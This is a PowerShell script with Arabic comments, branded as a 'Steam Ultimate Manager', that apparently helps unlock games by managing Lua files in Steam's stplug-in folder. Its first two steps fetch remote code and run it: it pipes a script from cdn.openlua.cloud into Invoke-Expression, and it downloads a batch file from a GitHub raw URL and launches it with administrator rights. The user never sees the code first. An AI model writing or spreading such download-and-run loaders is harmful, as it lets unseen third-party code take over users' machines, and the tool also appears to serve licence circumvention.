[Console]::InputEncoding = [System.Text.Encoding]::UTF8
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# --- إعدادات الهوية الخاصة بك (SEIF AFANDI) ---
$MyToolName = "SEIF AFANDI - STEAM ULTIMATE MANAGER"
$MyVersion = "v3.5"
$Author = "SEIF AFANDI"
$API = "https://api.steamproof.net"

# روابط الملفات الخاصة بسيف
$batUrl = "https://raw.githubusercontent.com/857seif/11111111/main/game.bat"
$batPath = Join-Path $env:TEMP "game_seif.bat"
$fixCommand = "irm -useb cdn.openlua.cloud/fix-download.ps1 | iex"

# ----------------------------------------------

function Show-SpinnerAndResult {
    param (
        [string]$SpinnerText,
        [ScriptBlock]$Action,
        [string]$ExtraInfo = $null,
        [string]$Tip = $null,
        [switch]$IsSubStep
    )
    $prefix = if ($IsSubStep) { '  ' } else { '' }
    $spinnerPos = [Console]::CursorTop
    $spinner = @('|', '/', '-', '\')
    Write-Host "$prefix$($spinner[0])" -NoNewline -ForegroundColor Cyan
    Write-Host " $SpinnerText" -ForegroundColor White
    
    $done = $false
    $i = 0
    $job = Start-Job -ScriptBlock $Action

    while (-not $done) {
        Start-Sleep -Milliseconds 100
        $char = $spinner[$i % $spinner.Count]
        if ([Console]::CursorTop -lt [Console]::BufferHeight) {
            [Console]::SetCursorPosition(0, $spinnerPos)
            Write-Host "$prefix$char" -NoNewline -ForegroundColor Cyan
            Write-Host " $SpinnerText" -NoNewline -ForegroundColor White
        }
        $i++
        if ($job.State -ne 'Running') { $done = $true }
    }
    $result = Receive-Job $job -ErrorAction SilentlyContinue
    Remove-Job $job | Out-Null

    [Console]::SetCursorPosition(0, $spinnerPos)
    [Console]::Write((' ' * ([Console]::WindowWidth-1)))
    [Console]::SetCursorPosition(0, $spinnerPos)
    
    if ($result -and $result.Success) {
        Write-Host "$prefix$([char]0x2713)" -NoNewline -ForegroundColor Green
        Write-Host " $SpinnerText" -ForegroundColor Green
    } else {
        Write-Host "${prefix}X" -NoNewline -ForegroundColor Red
        Write-Host " $SpinnerText" -ForegroundColor Red
    }
    return $result
}

# --- واجهة البداية ---
Clear-Host
Write-Host ""
Write-Host "  ===================================================" -ForegroundColor Cyan
Write-Host "  $MyToolName" -ForegroundColor Black -BackgroundColor Cyan
Write-Host "  BY: $Author - POWERED BY SEIF ENGINE" -ForegroundColor Gray
Write-Host "  ===================================================" -ForegroundColor Cyan
Write-Host ""

# --- الخطوة 1: تشغيل أمر إصلاح التحميل (Fix Download) ---
Show-SpinnerAndResult `
    -SpinnerText "جاري تهيئة إعدادات التحميل (Fix Download)..." `
    -Action {
        try {
            Invoke-Expression (Invoke-RestMethod -Uri "https://cdn.openlua.cloud/fix-download.ps1" -UseBasicParsing)
            return @{ Success = $true }
        } catch {
            return @{ Success = $false }
        }
    } | Out-Null

# --- الخطوة 2: تحميل وتشغيل ملف SEIF AFANDI الخارجي ---
$seifTask = Show-SpinnerAndResult `
    -SpinnerText "جاري جلب ملفات النظام من سيف أفندي..." `
    -Action {
        try {
            $client = New-Object System.Net.WebClient
            $client.DownloadFile($using:batUrl, $using:batPath)
            return @{ Success = $true }
        } catch {
            return @{ Success = $false; Extra = "فشل في تحميل ملف game.bat" }
        }
    }

if ($seifTask.Success -and (Test-Path $batPath)) {
    Write-Host "  [!] جاري تشغيل الملف بصلاحيات المسؤول (RunAs Admin)..." -ForegroundColor Yellow
    try {
        Start-Process "$batPath" -Verb RunAs -Wait
        Write-Host "  [✔] تم تشغيل ملف سيف بنجاح." -ForegroundColor Green
    } catch {
        Write-Host "  [X] تم إلغاء طلب صلاحيات المسؤول." -ForegroundColor Red
    }
}
Write-Host "  ---------------------------------------------------" -ForegroundColor Gray

# --- الخطوة 3: فحص Steam والـ Manifests ---
Add-Type -AssemblyName System.IO.Compression.FileSystem

$steamResult = Show-SpinnerAndResult `
    -SpinnerText 'البحث عن مسار Steam في جهازك' `
    -Action {
        $regPath = 'HKCU:\Software\Valve\Steam'
        if (Test-Path $regPath) {
            $path = (Get-ItemProperty $regPath).SteamPath -replace "/", "\"
            if ($path -and (Test-Path $path)) { return @{ Success = $true; Path = $path } }
        }
        return @{ Success = $false; Extra = 'لم يتم العثور على Steam' }
    }

if ($steamResult.Success) {
    $steamPath = $steamResult.Path
    $pluginDir = Join-Path $steamPath "config\stplug-in"
    
    $luaCheck = Show-SpinnerAndResult `
        -SpinnerText 'فحص ملفات stplug-in المتاحة' `
        -Action {
            if (-not (Test-Path $using:pluginDir)) { return @{ Success = $false } }
            $files = Get-ChildItem -Path $using:pluginDir -Filter "*.lua"
            return @{ Success = $true; Count = $files.Count }
        }

    if ($luaCheck.Success -and $luaCheck.Count -gt 0) {
        Write-Host "  [✔] تم التحقق من $($luaCheck.Count) ملف لوا بنجاح." -ForegroundColor Green
    }
}

# --- الخاتمة ---
Write-Host ""
Write-Host "  ***************************************************" -ForegroundColor Cyan
Write-Host "  اكتملت جميع العمليات! شكراً لك يا سيف أفندي." -ForegroundColor Black -BackgroundColor Green
Write-Host "  ***************************************************" -ForegroundColor Cyan
Write-Host ""
Write-Host "اضغط أي مفتاح لإغلاق السكربت..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
exit
